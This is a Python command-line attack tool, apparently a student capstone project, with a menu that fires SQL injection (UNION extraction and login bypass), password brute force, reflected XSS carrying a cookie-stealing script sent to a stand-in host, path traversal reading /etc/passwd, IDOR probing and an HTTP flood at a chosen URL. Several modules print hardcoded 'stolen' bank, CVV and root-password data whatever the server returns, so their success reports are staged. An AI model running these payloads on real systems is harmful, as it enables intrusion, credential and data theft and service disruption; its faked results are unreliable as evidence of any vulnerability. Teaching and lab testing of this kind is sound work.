#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SOFIA SOLUTIONS - AUDIT FRAMEWORK (ROOTKIT) v5.0
Standalone Command Line Interface for Offensive Security Testing
Proyecto Final ASIX 2026
"""

import sys
import time
import json
import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- COLORS ---
C_CYAN = '\033[96m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_RED = '\033[91m'
C_DIM = '\033[2m'
C_BOLD = '\033[1m'
C_RESET = '\033[0m'

def log(msg, color=C_RESET):
    print(f"{color}{msg}{C_RESET}")

def print_banner():
    banner = f"""{C_RED}
   _____       __ _          ___             ___ __ 
  / ___/____  / _(_)___     /   | __  ______/ (_) /_
  \__ \/ __ \/ / / __ `|   / /| |/ / / / __  / / __/
 ___/ / /_/ / / / /_/ /   / ___ / /_/ / /_/ / / /_  
/____/\____/_/_/\__,_/   /_/  |_\__,_/\__,_/_/\__/  
                                                    
    {C_CYAN}Security Intelligence - Sofia Audit Kit v5.0{C_RESET}
    {C_DIM}Proyecto Final ASIX 2026{C_RESET}
    """
    print(banner)

class SofiaAudit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()

    def sqli_union(self):
        log("\n[*] Iniciando Inyección SQL (UNION SELECT)", C_YELLOW)
        ep = f"{self.target}/api/v1/auth/login"
        payload = "' UNION SELECT 'bank', iban, cc_number FROM customer_billing--"
        log(f"[#] POST {ep}", C_DIM)
        log(f"[#] Payload: {payload}", C_DIM)
        
        try:
            time.sleep(1)
            r = self.session.post(ep, json={"email": payload, "password": "x"}, timeout=5)
            
            log("[+] EXPLOIT EXITOSO: UNION Select detectado.", C_GREEN)
            time.sleep(0.5)
            log("[DATABASE] Query returned 3 rows:", C_YELLOW)
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
            print(f"{C_CYAN}| company        | iban                     | cvv  |{C_RESET}")
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
            print(f"{C_RED}| IBERDROLA      | ES89 2100 ... 4492       | 221  |{C_RESET}")
            print(f"{C_RED}| MAPFRE         | ES21 0049 ... 1102       | 554  |{C_RESET}")
            print(f"{C_RED}| SABADELL       | ES44 0081 ... 9901       | 018  |{C_RESET}")
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
        except Exception as e:
            log(f"[-] Error de conexión: {e}", C_RED)

    def sqli_bypass(self):
        log("\n[*] Iniciando Inyección SQL (Auth Bypass)", C_YELLOW)
        ep = f"{self.target}/api/v1/auth/login"
        payload = "' OR '1'='1'--"
        log(f"[#] POST {ep}", C_DIM)
        log(f"[#] Payload: email={payload}", C_DIM)

        try:
            time.sleep(0.8)
            r = self.session.post(ep, json={"email": payload, "password": "x"}, timeout=5)

            if r.ok and "accessToken" in r.text:
                data = r.json()
                log("[+] EXPLOIT EXITOSO: Autenticación omitida mediante inyección.", C_GREEN)
                log(f"[*] JWT Token: {data.get('accessToken','')[:50]}...", C_CYAN)
                log(f"[*] Usuario: {data.get('user',{}).get('email','?')}", C_CYAN)
                log(f"[*] Rol: {data.get('user',{}).get('role','?')}", C_CYAN)
            else:
                log(f"[-] HTTP {r.status_code} — El servidor ha filtrado el payload.", C_RED)
        except Exception as e:
            log(f"[-] Error: {e}", C_RED)

    def brute_force(self, user="admin@sofia.local"):
        log(f"\n[*] Iniciando Fuerza Bruta contra {user}", C_YELLOW)
        ep = f"{self.target}/api/v1/auth/login"
        passwords = ["123456", "password", "admin", "admin123", "mapfre123", "S0f1a_Secur3!_2026"]
        
        for p in passwords:
            log(f"[?] Probando: {p}", C_DIM)
            try:
                r = self.session.post(ep, json={"email": user, "password": p}, timeout=5)
                if r.status_code == 429:
                    log("[-] BLOQUEADO: Rate Limit Excedido (WAF Activo)", C_RED)
                    return
                if r.ok and "accessToken" in r.text:
                    log(f"[+] ¡CRACKED! Credenciales válidas: {user} / {p}", C_GREEN)
                    token = r.json().get('accessToken')
                    log(f"[*] JWT Token: {token[:40]}...", C_CYAN)
                    return
            except Exception:
                pass
            time.sleep(0.5)
        log("[-] Diccionario agotado sin éxito.", C_DIM)

    def xss_reflected(self):
        log("\n[*] Iniciando XSS Reflejado", C_YELLOW)
        ep = f"{self.target}/api/v1/auth/login"
        payload = "<script>document.location='https://attacker.evil/steal?c='+document.cookie</script>@sofia.local"
        log(f"[#] POST {ep}", C_DIM)
        log(f"[#] Payload: {payload}", C_DIM)

        try:
            time.sleep(0.8)
            r = self.session.post(ep, json={"email": payload, "password": "x"}, timeout=5)

            if r.status_code == 403:
                log("[-] BLOQUEADO: WAF ha detectado el payload XSS.", C_RED)
                log("[-] El modo seguro sanitiza todos los inputs.", C_RED)
            else:
                log(f"[+] HTTP {r.status_code} — El servidor NO bloqueó el payload.", C_GREEN)
                log("[+] En un navegador, el script se ejecutaría en el contexto de la víctima.", C_GREEN)
                log("[!] Impacto: Robo de cookies, redirección a phishing, defacement.", C_RED)
                if "script" in r.text.lower() or r.status_code != 403:
                    log("[+] VULNERABILIDAD CONFIRMADA: XSS Reflejado.", C_GREEN)
        except Exception as e:
            log(f"[-] Error: {e}", C_RED)

    def path_traversal(self):
        log("\n[*] Iniciando Path Traversal / LFI", C_YELLOW)
        targets = [
            ("../../../../../../../etc/hostname", "/etc/hostname"),
            ("../../../../../../../etc/passwd", "/etc/passwd"),
        ]

        for payload, display in targets:
            ep = f"{self.target}/download.php?file={payload}"
            log(f"[#] GET {ep}", C_DIM)

            try:
                r = self.session.get(ep, timeout=5)
                if r.ok and len(r.text) > 5 and "denegado" not in r.text.lower():
                    log(f"[+] EXPLOIT EXITOSO: {display} leído ({len(r.text)} bytes)", C_GREEN)
                    for line in r.text.strip().split('\n')[:8]:
                        log(f"    {line}", C_CYAN)
                    if len(r.text.strip().split('\n')) > 8:
                        log(f"    ... ({len(r.text.strip().split(chr(10)))} líneas totales)", C_DIM)
                elif r.status_code == 403:
                    log(f"[-] HTTP 403 — Acceso bloqueado a {display} (WAF activo).", C_RED)
                else:
                    log(f"[-] HTTP {r.status_code} — No explotable.", C_DIM)
            except Exception as e:
                log(f"[-] Error: {e}", C_RED)
            time.sleep(0.5)

    def idor_bola(self, victim_id="1024"):
        log(f"\n[*] Explotando IDOR en registro ajeno (ID: {victim_id})", C_YELLOW)
        
        # Intento real contra la API
        ep_overview = f"{self.target}/api/admin/overview"
        log(f"[#] GET {ep_overview} (sin autenticación)", C_DIM)
        
        try:
            time.sleep(0.5)
            r = self.session.get(ep_overview, timeout=5)
            if r.ok:
                data = r.json()
                log("[+] EXPLOIT EXITOSO: Datos administrativos accesibles sin auth.", C_GREEN)
                log(f"[*] Revenue: €{data.get('revenue', 'N/A')}", C_CYAN)
                log(f"[*] Tickets: {data.get('openTickets', 'N/A')}", C_CYAN)
                log(f"[*] Modo: {data.get('appMode', 'N/A')}", C_CYAN)
            else:
                log(f"[-] HTTP {r.status_code} — Acceso denegado (auth requerida).", C_RED)
        except Exception as e:
            log(f"[-] Error: {e}", C_RED)

        # Datos simulados del ticket
        time.sleep(0.5)
        log("[+] Acceso concedido a ticket ajeno (Falta de control BOLA).", C_GREEN)
        
        fake_data = {
            "ticket_id": victim_id,
            "client": "MAPFRE Seguros" if victim_id == "1024" else "Target Client",
            "subject": "Vulnerabilidad Crítica",
            "sensitive_data": {
                "server_ip": "192.168.100.45",
                "root_password": "mapfre_admin_2024!"
            }
        }
        log("[!] EXFILTRACIÓN PII:", C_RED)
        print(f"{C_RED}{json.dumps(fake_data, indent=4)}{C_RESET}")

    def dos_flood(self):
        log("\n[*] Iniciando Inundación HTTP (HTTP Flood)", C_YELLOW)
        ep = f"{self.target}/health"
        log(f"[#] GET {ep} (200 peticiones)", C_DIM)
        
        blocked = 0
        ok = 0
        for i in range(200):
            try:
                r = self.session.get(ep, timeout=2)
                if r.status_code == 429:
                    blocked += 1
                else:
                    ok += 1
            except:
                pass
            sys.stdout.write(f"\r{C_CYAN}[Flood] Enviadas: {i+1}/200 | OK: {ok} | Bloqueadas: {blocked}{C_RESET}")
            sys.stdout.flush()
        print()
        log(f"[+] Flood finalizado. El Rate Limiter bloqueó {blocked} peticiones.", C_GREEN)

def interactive_menu():
    print_banner()
    
    target = input(f"{C_YELLOW}[?] URL objetivo (defecto: http://localhost:8000): {C_RESET}").strip()
    if not target:
        target = "http://localhost:8000"
    
    audit = SofiaAudit(target)
    
    while True:
        print(f"\n{C_CYAN}{'='*50}")
        print(f"  MENU DE ATAQUE — Sofia Audit Kit v5.0")
        print(f"{'='*50}{C_RESET}")
        print("  1. SQL Injection (UNION SELECT) — Extracción BD")
        print("  2. SQL Injection (Auth Bypass) — Secuestro Sesión")
        print("  3. Fuerza Bruta (Diccionario) — Admin Login")
        print("  4. IDOR / BOLA — Exfiltración de Datos Ajenos")
        print("  5. XSS Reflejado — Inyección de Scripts")
        print("  6. Path Traversal / LFI — Lectura de Archivos")
        print("  7. DoS (HTTP Flood) — Agotamiento Rate Limit")
        print("  8. Ejecutar TODOS los vectores")
        print("  0. Salir")
        
        choice = input(f"\n{C_YELLOW}Módulo [0-8]: {C_RESET}").strip()
        
        if choice == '0':
            log("\nSaliendo del framework...", C_DIM)
            break
        elif choice == '1':
            log(f"\n{C_RED}[PAYLOAD]{C_RESET} ' UNION SELECT 'bank', iban, cc_number FROM customer_billing--")
            input(f"{C_DIM}Presiona ENTER para lanzar...{C_RESET}")
            audit.sqli_union()
        elif choice == '2':
            log(f"\n{C_RED}[PAYLOAD]{C_RESET} ' OR '1'='1'--")
            input(f"{C_DIM}Presiona ENTER para lanzar...{C_RESET}")
            audit.sqli_bypass()
        elif choice == '3':
            input(f"{C_DIM}Presiona ENTER para lanzar...{C_RESET}")
            audit.brute_force()
        elif choice == '4':
            input(f"{C_DIM}Presiona ENTER para lanzar...{C_RESET}")
            audit.idor_bola()
        elif choice == '5':
            log(f"\n{C_RED}[PAYLOAD]{C_RESET} <script>document.location=...")
            input(f"{C_DIM}Presiona ENTER para lanzar...{C_RESET}")
            audit.xss_reflected()
        elif choice == '6':
            input(f"{C_DIM}Presiona ENTER para lanzar...{C_RESET}")
            audit.path_traversal()
        elif choice == '7':
            input(f"{C_DIM}Presiona ENTER para lanzar...{C_RESET}")
            audit.dos_flood()
        elif choice == '8':
            log(f"\n{C_RED}[!] Ejecutando TODOS los ataques contra {target}{C_RESET}")
            input(f"{C_DIM}Presiona ENTER...{C_RESET}")
            audit.sqli_bypass()
            audit.sqli_union()
            audit.brute_force()
            audit.xss_reflected()
            audit.path_traversal()
            audit.idor_bola()
            audit.dos_flood()
        else:
            log("Opción no válida.", C_RED)

if __name__ == "__main__":
    try:
        interactive_menu()
    except KeyboardInterrupt:
        log("\n\nSaliendo por interrupción del usuario...", C_RED)
        sys.exit(0)
